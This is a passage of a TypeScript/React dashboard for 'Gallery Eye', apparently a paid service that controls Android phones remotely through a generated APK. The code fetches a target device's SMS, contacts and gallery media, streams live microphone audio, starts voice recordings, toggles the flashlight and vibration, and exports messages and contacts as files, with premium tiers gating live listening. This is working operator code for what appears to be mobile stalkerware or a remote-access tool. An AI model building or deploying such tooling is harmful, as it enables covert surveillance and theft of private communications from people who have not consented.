                }
                delete (window as any).fetchGalleryData;
            };
        }
    }, [status, session?.user?.uuid]);

    useEffect(() => {
        const loader = galleryLoaderRef.current;
        if (!loader || !galleryHasMore) return;
        const observer = new IntersectionObserver((entries) => {
            if (entries[0].isIntersecting && galleryHasMore && !isLoadingMore && (window as any).fetchGalleryData) {
                (window as any).fetchGalleryData(galleryPage + 1, true);
            }
        }, { rootMargin: '200px' });
        observer.observe(loader);
        return () => observer.disconnect();
    }, [galleryHasMore, galleryPage, isLoadingMore]);

    const fetchFolders = () => {
        if (socket && selectedDeviceId) {
            socket.emit("get_folders", {
                uuid: session?.user?.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    const handleFolderClick = (folder: any) => {
        // Prevent clicking while upload is in progress
        if (uploadProgress) {
            alert("Please wait for the current sync to complete.");
            return;
        }
        setSelectedFolder(folder);
        setSyncMediaType(null); // Reset media type selection
    };

    // SMS Functions
    const fetchSms = () => {
        // Plan check - SMS requires Standard or Premium
        if (!planLimits.sms) {
            showUpgradePrompt('SMS Access', 'standard');
            return;
        }
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingSms(true);
            socket.emit("get_sms", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    const resetSmsSync = () => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit("reset_sms_sync", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
            setSmsList([]);
        }
    };

    // Contacts Functions
    const fetchContacts = () => {
        // Plan check - Contacts requires Standard or Premium
        if (!planLimits.contacts) {
            showUpgradePrompt('Contacts Access', 'standard');
            return;
        }
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingContacts(true);
            socket.emit("get_contacts", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    // Permission Check Function
    const checkPermissions = () => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsCheckingPermissions(true);
            setDevicePermissions(null);
            socket.emit("check_permissions", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        } else {
            alert("Please select an online device first.");
        }
    };

    // Filtered SMS based on search
    const filteredSms = useMemo(() => {
        if (!smsSearchQuery) return smsList;
        const query = smsSearchQuery.toLowerCase();
        return smsList.filter(sms =>
            sms.address?.toLowerCase().includes(query) ||
            sms.body?.toLowerCase().includes(query)
        );
    }, [smsList, smsSearchQuery]);

    // Filtered Contacts based on search
    const filteredContacts = useMemo(() => {
        if (!contactsSearchQuery) return contactsList;
        const query = contactsSearchQuery.toLowerCase();
        return contactsList.filter(contact => {
            const nameMatch = contact.name?.toLowerCase()?.includes(query) || false;
            const phoneMatch = contact.phones?.some((p: any) => {
                // Handle both string and object phone entries
                const phoneStr = typeof p === 'string' ? p : (p?.number || p?.value || String(p));
                return phoneStr?.toLowerCase()?.includes(query) || false;
            }) || false;
            return nameMatch || phoneMatch;
        });
    }, [contactsList, contactsSearchQuery]);


    const triggerUpload = (count: number | 'all') => {
        if (socket && selectedFolder && syncMediaType && session?.user?.uuid && selectedDeviceId) {
            const payload = {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId,
                folderId: selectedFolder.id,
                folderName: selectedFolder.name,
                count: count,
                mediaType: syncMediaType
            };
            socket.emit("trigger_sync", payload);
            setIsStartingSync(true); // Start loading animation
            setSelectedFolder(null);
            setSyncMediaType(null);
        } else {
            console.error('[triggerUpload] Missing required data:', {
                hasSocket: !!socket,
                hasFolder: !!selectedFolder,
                hasMediaType: !!syncMediaType,
                hasUUID: !!session?.user?.uuid,
                hasDevice: !!selectedDeviceId
            });
        }
    };

    // --- Torch Functions ---
    const toggleTorch = () => {
        // Plan check - Torch requires Standard or Premium
        if (!planLimits.torch) {
            showUpgradePrompt('Flashlight Control', 'standard');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            alert("Please select an online device first.");
            return;
        }

        const newState = !isTorchOn;
        setIsTorchOn(newState);

        socket.emit("torch_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            on: newState,
            aggressive: torchAggressive,
            duration: torchDuration
        });
    };

    // --- Vibration Functions ---
    const triggerVibration = () => {
        // Plan check - Vibration requires Standard or Premium
        if (!planLimits.vibration) {
            showUpgradePrompt('Vibration Control', 'standard');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            alert("Please select an online device first.");
            return;
        }

        socket.emit("vibrate_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            duration: vibrationDuration
        });
    };

    // --- Live Audio Functions ---
    const startLiveAudio = useCallback(() => {
        if (userPlan !== 'premium') {
            showUpgradePrompt('Live Audio Listening', 'premium');
            return;
        }
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
            setShowCustomAlert(true);
            return;
        }

        // AudioContext will be auto-created when first live_audio chunk arrives.
        // Just tell the device to start sending audio.
        socket.emit('start_live_audio', {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            gainBoost: false
        });
        setIsLiveAudio(true);
        isLiveAudioRef.current = true;
        setAudioError(null);
        setAudioElapsed(0);
        audioTimerRef.current = setInterval(() => {
            setAudioElapsed(prev => prev + 1);
        }, 1000);
    }, [socket, selectedDeviceId, session, userPlan]);

    const stopLiveAudio = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('stop_live_audio', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }

        // Cleanup timer
        if (audioTimerRef.current) {
            clearInterval(audioTimerRef.current);
            audioTimerRef.current = null;
        }

        // Cleanup visualizer
        if (audioAnimFrameRef.current) {
            cancelAnimationFrame(audioAnimFrameRef.current);
            audioAnimFrameRef.current = 0;
        }

        // Cleanup ScriptProcessorNode
        try {
            audioProcessorRef.current?.disconnect();
        } catch (e) { /* ignore */ }
        audioProcessorRef.current = null;

        // Cleanup AudioContext
        try {
            audioContextRef.current?.close();
        } catch (e) { /* ignore */ }
        audioContextRef.current = null;
        audioGainRef.current = null;
        audioAnalyserRef.current = null;

        // Reset ring buffer
        audioRingWriteRef.current = 0;
        audioRingReadRef.current = 0;
        audioRingSamplesRef.current = 0;

        setIsLiveAudio(false);
        isLiveAudioRef.current = false;
        setAudioLevel(0);
        setAudioElapsed(0);
    }, [socket, selectedDeviceId, session]);

    // --- Voice Recording Functions ---
    const startVoiceRecording = useCallback(() => {
        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
            setShowCustomAlert(true);
            return;
        }
        socket.emit('start_voice_recording', {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            duration: voiceRecDuration
        });
        setIsVoiceRecording(true);
        setVoiceRecProgress({ current: 0, total: voiceRecDuration });

        // Local progress timer
        let elapsed = 0;
        voiceRecTimerRef.current = setInterval(() => {
            elapsed++;
            setVoiceRecProgress(prev => ({ ...prev, current: elapsed }));
            if (elapsed >= voiceRecDuration) {
                clearInterval(voiceRecTimerRef.current!);
                voiceRecTimerRef.current = null;
            }
        }, 1000);
    }, [socket, selectedDeviceId, session, voiceRecDuration]);

    const stopVoiceRecording = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('stop_voice_recording', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
        setIsVoiceRecording(false);
        setVoiceRecProgress({ current: 0, total: 0 });
        if (voiceRecTimerRef.current) {
            clearInterval(voiceRecTimerRef.current);
            voiceRecTimerRef.current = null;
        }
    }, [socket, selectedDeviceId, session]);

    // Update gain when volume/mute changes
    useEffect(() => {
        if (audioGainRef.current) {
            audioGainRef.current.gain.value = isMuted ? 0 : audioVolume / 100;
        }
    }, [audioVolume, isMuted]);

    // Format seconds to MM:SS
    const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;

    // --- Gallery Logic ---

    const hasVideos = useMemo(() => images.some(img => img.resource_type === 'video'), [images]);

    const filteredImages = useMemo(() => {
        if (activeTab === 'all') return images;
        return images.filter(img => img.resource_type === activeTab);
    }, [images, activeTab]);

    const toggleSelection = (id: string) => {
        const newSelection = new Set(selectedItems);
        if (newSelection.has(id)) {
            newSelection.delete(id);
        } else {
            newSelection.add(id);
        }
        setSelectedItems(newSelection);
        if (newSelection.size === 0) setIsSelectionMode(false);
        else setIsSelectionMode(true);
    };

    const selectAll = () => {
        if (selectedItems.size === filteredImages.length) {
            setSelectedItems(new Set());
            setIsSelectionMode(false);
        } else {
            setSelectedItems(new Set(filteredImages.map(img => img.id)));
            setIsSelectionMode(true);
        }
    };

    const deleteSelected = async () => {
        if (!confirm("Are you sure you want to delete these items?")) return;
        setIsDeleting(true);
        const idsToDelete = Array.from(selectedItems);

        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ids: idsToDelete })
            });

            if (response.ok) {
                setImages(prev => prev.filter(img => !selectedItems.has(img.id)));
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Delete failed", error);
        } finally {
            setIsDeleting(false);
        }
    };

    const downloadSelected = async () => {
        const selectedUrls = images.filter(img => selectedItems.has(img.id)).map(img => img.url);
        if (selectedUrls.length === 0) return;

        // If only 1 file is selected, download it directly instead of making a ZIP
        if (selectedUrls.length === 1) {
            const singleFileUrl = selectedUrls[0];
            const fileExt = singleFileUrl.split('.').pop()?.split('?')[0] || 'file';
            downloadSingle(singleFileUrl, `gallery_eye_${Date.now()}.${fileExt}`);
            setSelectedItems(new Set());
            setIsSelectionMode(false);
            return;
        }

        setIsDownloading(true);
        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-zip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls: selectedUrls })
            });

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `gallery_download_${new Date().toISOString()}.zip`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Download failed", error);
        } finally {
            setIsDownloading(false);
        }
    };

    const downloadSingle = async (url: string, filename: string) => {
        try {
            // Proxies the Cloudflare R2 fetch through the Next.js API to set 'Content-Disposition: attachment'
            // This forces the browser to download the file directly instead of opening it in a new tab due to cross-origin limitations.
            const proxyUrl = `/api/download?url=${encodeURIComponent(url)}&filename=${encodeURIComponent(filename)}`;
            
            const link = document.createElement('a');
            link.href = proxyUrl;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (error) {
            console.error("Download failed", error);
            window.open(url, '_blank');
        }
    };

    // Download SMS as CSV
    const downloadSmsAsCsv = () => {
        if (smsList.length === 0) return;

        const headers = ['Address', 'Body', 'Date', 'Type'];
        const csvContent = [
            headers.join(','),
            ...smsList.map(sms => [
                `"${(sms.address || '').replace(/"/g, '""')}"`,
                `"${(sms.body || '').replace(/"/g, '""')}"`,
                new Date(sms.date).toISOString(),
                sms.type === 1 ? 'Received' : 'Sent'
            ].join(','))
        ].join('\n');

        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `sms_backup_${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    // Download Contacts as vCard
    const downloadContactsAsVcf = () => {
        if (contactsList.length === 0) return;

        const vcards = contactsList.map(contact => {
            const name = contact.name || 'Unknown';
            const phones = contact.phones?.map((p: any) => {
                const num = typeof p === 'string' ? p : (p?.number || p?.value || '');
                return `TEL:${num}`;
            }).join('\n') || '';
            const emails = contact.emails?.map((e: any) => {
                const email = typeof e === 'string' ? e : (e?.address || e?.value || '');
                return `EMAIL:${email}`;
            }).join('\n') || '';

            return `BEGIN:VCARD
VERSION:3.0
FN:${name}
N:${name};;;
${phones}
${emails}
END:VCARD`;
        }).join('\n');

        const blob = new Blob([vcards], { type: 'text/vcard;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `contacts_backup_${new Date().toISOString().split('T')[0]}.vcf`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    if (status === "loading") {
        return (
            <div className="min-h-[100dvh] flex items-center justify-center" style={{ background: 'var(--bg-base)' }}>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '1.25rem' }}>
                    <div style={{
                        width: 48, height: 48, borderRadius: '50%',
                        border: '2px solid rgba(91,94,244,0.2)',
                        borderTopColor: 'var(--accent)',
                        animation: 'spin 1s linear infinite',
                    }} />
                    <span style={{ color: 'var(--text-muted)', fontSize: '0.875rem' }}>Loading…</span>
                </div>
            </div>
        );
    }

    if (status === "unauthenticated") return null;

    const onlineDeviceCount = devices.filter(d => d.online).length;

    return (
        <main className="min-h-[100dvh] pb-24" style={{ background: 'var(--bg-base)', color: 'var(--text-primary)' }}>
            {/* Ambient background orbs */}
            <div style={{ position: 'fixed', inset: 0, zIndex: 0, overflow: 'hidden', pointerEvents: 'none' }}>
                <div style={{
                    position: 'absolute', top: '-8%', left: '-8%', width: '45%', height: '45%',
                    background: 'radial-gradient(circle, rgba(91,94,244,0.12) 0%, transparent 70%)',
                    filter: 'blur(80px)', borderRadius: '50%',
                }} />
                <div style={{
                    position: 'absolute', bottom: '-8%', right: '-8%', width: '40%', height: '40%',
                    background: 'radial-gradient(circle, rgba(34,211,238,0.08) 0%, transparent 70%)',
                    filter: 'blur(80px)', borderRadius: '50%',
                }} />
                    {/* Navbar — floating glass pill */}
            <nav style={{
                position: 'sticky', top: 0, zIndex: 'var(--z-sticky)' as any,
                padding: '0.5rem 0.75rem',
                transition: 'all 0.3s cubic-bezier(0.32,0.72,0,1)',
            }}>
                <div style={{
                    maxWidth: 1280, margin: '0 auto',
                    display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                    padding: '0.5rem 0.75rem',
                    background: isScrolled ? 'rgba(10,10,15,0.88)' : 'rgba(18,18,26,0.60)',
                    backdropFilter: 'blur(24px)', WebkitBackdropFilter: 'blur(24px)',
                    border: '1px solid var(--border-normal)',
                    borderRadius: '1.25rem',
                    boxShadow: isScrolled ? 'var(--shadow-md)' : 'none',
                    transition: 'background 0.3s cubic-bezier(0.32,0.72,0,1), box-shadow 0.3s cubic-bezier(0.32,0.72,0,1)',
                }}>
                    {/* Left — Logo + Plan */}
                    <div className="flex items-center gap-2">
                        <button
                            onClick={() => {
                                setIsSettingsOpen(true);
                                setIsDeviceDropdownOpen(false);
                                setIsToolDropdownOpen(false);
                                setShowAppModal(false);
                            }}
                            title="Settings & Permission Check"
                            className="w-9 h-9 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 active:scale-95 transition-transform"
                        >
                            <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                        </button>
                        <PlanBadge plan={userPlan} onClick={() => {
                            setShowPlansModal(true);
                            setIsDeviceDropdownOpen(false);
                            setIsToolDropdownOpen(false);
                            setIsSettingsOpen(false);
                        }} />
                        <span className="font-bold text-sm tracking-tight text-white hidden xs:block">Gallery Eye</span>
                    </div>

                    {/* Right — Active actions on both mobile and desktop */}
                    <div className="flex items-center gap-1.5">
                        {/* Mobile & Desktop Tool Switcher Selector */}
                        <button
                            onClick={() => {
                                setIsToolDropdownOpen(prev => !prev);
                                setIsDeviceDropdownOpen(false);
                                setIsSettingsOpen(false);
                                setShowAppModal(false);
                            }}
                            className="flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-white/5 border border-white/10 text-white/70 active:scale-95 transition-all"
                        >
                            {toolDetails[selectedTool]?.icon || toolDetails.gallery.icon}
                            <span className="hidden sm:inline text-xs font-semibold">Tools</span>
                            <svg className="w-3 h-3 opacity-60" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M19 9l-7 7-7-7"></path></svg>
                        </button>

                        {/* Device Selector (Desktop only to prevent clutter) */}
                        <button
                            onClick={() => {
                                setIsDeviceDropdownOpen(prev => !prev);
                                setIsToolDropdownOpen(false);
                                setIsSettingsOpen(false);
                                setShowAppModal(false);
                            }}
                            className="hidden md:flex items-center gap-1.5 px-2.5 py-1.5 rounded-xl bg-white/5 border border-white/10 text-white/70 active:scale-95 transition-all"
                        >
                            <div className={`w-1.5 h-1.5 rounded-full ${onlineDeviceCount > 0 ? 'bg-emerald-400' : 'bg-rose-400'}`} />
                            <span className="text-xs font-semibold">Device</span>
                            <svg className="w-3 h-3 opacity-60" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M19 9l-7 7-7-7"></path></svg>
                        </button>

                        {/* App Builder / Download App */}
                        <button
                            onClick={() => {
                                setShowAppModal(true);
                                setIsDeviceDropdownOpen(false);
                                setIsToolDropdownOpen(false);
                                setIsSettingsOpen(false);
                            }}
                            className="flex items-center justify-center w-9 h-9 rounded-xl bg-indigo-600 text-white hover:bg-indigo-500 active:scale-95 transition-all"
                            title="Build / Download APK"
                        >
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M12 4v12m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
                        </button>

                        {/* Support Button (WhatsApp link) */}
                        <a
                            href="https://wa.me/923460257488?text=Hello%2C%20I%20need%20help%20with%20GalleryEye."
                            target="_blank"
                            rel="noopener noreferrer"
                            className="w-9 h-9 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400 hover:bg-emerald-500/20 active:scale-95 transition-all"
                            title="Support Chat"
                        >
                            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
                                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.008-.57-.008-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z" />
                            </svg>
                        </a>

                        {/* Logout Button */}
                        <button
                            onClick={() => signOut()}
                            className="w-9 h-9 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 hover:bg-red-500/20 active:scale-95 transition-all"
                            title="Logout"
                        >
                            <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
                        </button>
                    </div>
                </div>
            </nav>

            <div className="relative max-w-7xl mx-auto px-4 md:px-6 py-8 content-safe">

                {/* Remote Control Section */}
                <div className="mb-12">

                    {/* Show Welcome Screen when no device is selected */}
                    {!selectedDeviceId && devices.filter(d => d.online).length === 0 ? (
                        <div className="py-12 flex flex-col items-center justify-center animate-fadeIn">
                            <div className="max-w-md mx-auto text-center space-y-8">
                                <div className="relative inline-block">
                                    <div className="w-20 h-20 mx-auto rounded-2xl bg-gradient-to-br from-indigo-500/15 to-violet-500/15 border border-indigo-500/20 flex items-center justify-center animate-float">
                                        <svg className="w-10 h-10 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                    </div>
                                    <div className="absolute -top-1 w-6 h-6 bg-emerald-500 rounded-full flex items-center justify-center shadow-[0_0_12px_rgba(52,211,153,0.4)]" style={{ left: 'calc(50% + 24px)' }}>
                                        <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
                                    </div>
                                </div>
                                <div>
                                    <h3 className="text-2xl font-bold tracking-tight text-white mb-2">Welcome to GalleryEye</h3>
                                    <p className="text-white/35 text-sm">Get started by connecting your device</p>
                                </div>
                                <div className="grid gap-3 text-left stagger-children">
                                    <div className="bezel animate-slideUp">
                                        <div className="bezel-inner flex items-center gap-4 p-4">
                                            <div className="w-10 h-10 rounded-xl bg-indigo-500/15 border border-indigo-500/20 flex items-center justify-center flex-shrink-0">
                                                <span className="text-lg font-bold text-indigo-400 font-data">1</span>
                                            </div>
                                            <div>
                                                <p className="text-sm font-semibold text-white/90">Download the app</p>
                                                <p className="text-xs text-white/30">Tap &quot;Download App&quot; to generate your APK</p>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="bezel animate-slideUp">
                                        <div className="bezel-inner flex items-center gap-4 p-4">
                                            <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/20 flex items-center justify-center flex-shrink-0">
                                                <span className="text-lg font-bold text-cyan-400 font-data">2</span>
                                            </div>
                                            <div>
                                                <p className="text-sm font-semibold text-white/90">Select your device</p>
                                                <p className="text-xs text-white/30">Once installed, your device will appear in the &quot;Device&quot; menu</p>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="bezel animate-slideUp">
                                        <div className="bezel-inner flex items-center gap-4 p-4">
                                            <div className="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center flex-shrink-0">
                                                <span className="text-lg font-bold text-emerald-400 font-data">3</span>
                                            </div>
                                            <div>
                                                <p className="text-sm font-semibold text-white/90">Use the tools</p>
                                                <p className="text-xs text-white/30">Pick from Gallery, Camera, SMS &amp; more using the Tools menu</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <button
                                    onClick={() => setShowAppModal(true)}
                                    className="btn-primary text-base px-8 py-3.5 shadow-[0_0_24px_rgba(99,102,241,0.25)]"
                                >
                                    Get started
                                    <span className="btn-icon-trail">
                                        <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M17 8l4 4m0 0l-4 4m4-4H3"></path></svg>
                                    </span>
                                </button>
                            </div>
                        </div>
                    ) : (
                        <>
                            <div className="flex items-center justify-between mb-6">
                                <div className="flex flex-col gap-1">
                                    <h2 className="text-2xl font-bold">Remote Control</h2>
                                    {selectedDeviceId ? (
                                        <span className={`text-sm font-medium flex items-center gap-2 ${devices.find(d => d.deviceId === selectedDeviceId)?.online ? 'text-green-400' : 'text-gray-400'}`}>
                                            {devices.find(d => d.deviceId === selectedDeviceId)?.online ? 'Connected to:' : 'Viewing offline device:'} {devices.find(d => d.deviceId === selectedDeviceId)?.name}
                                        </span>
                                    ) : (
                                        <span className="text-sm text-white/40">Select a device from the top right to enable controls</span>
                                    )}
                                </div>
                            </div>

                            {/* Gallery Tool - Folder View */}
                            {selectedTool === 'gallery' && (
                                <>
                                    <div className="flex justify-end mb-4">
                                        <button
                                            onClick={fetchFolders}
                                            disabled={!selectedDeviceId}
                                            className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
                                        >
                                            Refresh Folders
                                        </button>
                                    </div>

                                    {folders.length > 0 ? (
                                        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-3">
                                            {folders.map((folder: any, idx) => (
                                    <button key={idx} onClick={() => handleFolderClick(folder)} className="bezel group text-left">
                                    <div className="bezel-inner p-4 transition-transform group-hover:scale-[1.01] group-active:scale-[0.97]">
                                                    <div className="flex justify-between items-start mb-2">
                                                        <div className="p-1.5 rounded-lg bg-purple-500/20 text-purple-400">
                                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
                                                        </div>
                                                    </div>
                                                    <div className="truncate font-medium text-sm">{folder.name}</div>
                                                    <div className="text-xs text-white/40">
                                                        {folder.imageCount > 0 && folder.videoCount > 0
                                                            ? `${folder.imageCount} 📷 • ${folder.videoCount} 🎥`
                                                            : folder.imageCount > 0
                                                                ? `${folder.imageCount} images`
                                                                : `${folder.videoCount} videos`}
                                                    </div>
                                        </div>
                                </button>
                                            ))}
                                        </div>
                                    ) : (
                                        <div className="py-12 flex flex-col items-center justify-center">
                                            <div className="max-w-sm mx-auto text-center space-y-4">
                                                <div className="w-16 h-16 mx-auto rounded-2xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center">
                                                    <svg className="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                                </div>
                                                <div>
                                                    <p className="text-white/60 font-medium">No albums loaded yet</p>
                                                    <p className="text-white/30 text-sm">Click the button below to load albums from your device</p>
                                                </div>
                                                <button
                                                    onClick={fetchFolders}
                                                    className="px-5 py-2.5 rounded-xl bg-white/10 border border-white/10 text-white/70 text-sm font-medium hover:bg-white/15 transition-colors"
                                                >
                                                    Load Albums
                                                </button>
                                            </div>
                                        </div>
                                    )}
                                </>
                            )}

                            {/* SMS Tool */}
                            {selectedTool === 'sms' && (
                                <div className="space-y-4">
                                    <div className="flex flex-col sm:flex-row gap-3 justify-between items-start sm:items-center">
                                        <div className="flex gap-2">
                                            <button
                                                onClick={fetchSms}
                                                disabled={!selectedDeviceId || isFetchingSms}
                                                className={`px-4 py-2 rounded-lg border transition-colors text-sm font-medium flex items-center gap-2 ${selectedDeviceId ? 'bg-white text-black hover:bg-gray-200' : 'bg-white/5 border-white/5 text-white/20 cursor-not-allowed'}`}
                                            >
                                                {isFetchingSms ? (
                                                    <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                                                ) : (
                                                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                                )}
                                                {smsList.length > 0 ? 'Fetch New SMS' : 'Fetch All SMS'}
                                            </button>
                                            {smsList.length > 0 && (
                                                <>
                                                    <button
                                                        onClick={resetSmsSync}
